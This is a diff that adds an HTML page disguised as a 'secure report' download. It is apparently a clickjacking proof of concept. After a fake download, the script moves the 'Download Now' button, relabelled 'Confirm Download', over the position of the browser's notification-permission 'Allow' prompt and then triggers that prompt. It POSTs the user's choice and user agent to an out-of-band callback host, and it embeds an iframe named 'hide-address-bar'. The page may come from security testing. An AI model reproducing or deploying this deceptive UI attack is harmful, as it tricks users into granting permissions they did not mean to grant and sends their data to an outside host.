@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download Dumzy Report</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    iframe { width: 80%; height: 300px; border: 1px solid #ccc; }
+    #download-btn {
+      background: #007bff; color: white;
+      padding: 16px 30px;
+      border: none;
+      font-size: 20px;
+      border-radius: 10px;
+      cursor: pointer;
+      position: absolute;
+      top: 380px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
+      transition: all 0.5s ease;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>📄 Download Your Secure Report</h2>
+  <p>Click the button below to begin secure download:</p>
+  
+  <iframe src="https://sauceialist.github.io/justwanna/hide-address-bar.html" sandbox="allow-scripts"></iframe>
+
+  <button id="download-btn" onclick="handleClick()">Download Now</button>
+
+  <script>
+    let clicked = false;
+
+    function handleClick() {
+      const btn = document.getElementById('download-btn');
+
+      // Step 1: Fake download
+      const a = document.createElement('a');
+      a.href = 'data:text/html,<h1>Dumzy Report</h1><p>This is your secure report.</p>';
+      a.download = 'dumzy_report.html';
+      document.body.appendChild(a);
+      a.click();
+
+      // Step 2: Move button above notification "Allow"
+      if (!clicked) {
+        btn.style.top = "110px";
+        btn.style.left = "430px";
+        btn.textContent = "Confirm Download";
+        clicked = true;
+
+        // Step 3: Trigger permission prompt with slight delay
+        setTimeout(() => {
+          Notification.requestPermission().then(result => {
+            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/chain-iframe-notif', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                permission: result,
+                ua: navigator.userAgent,
+                ts: Date.now()
+              })
+            });
+          });
+        }, 600);
+      } else {
+        alert("Download in progress...");
+      }
+    }
+  </script>
+</body>
+</html>
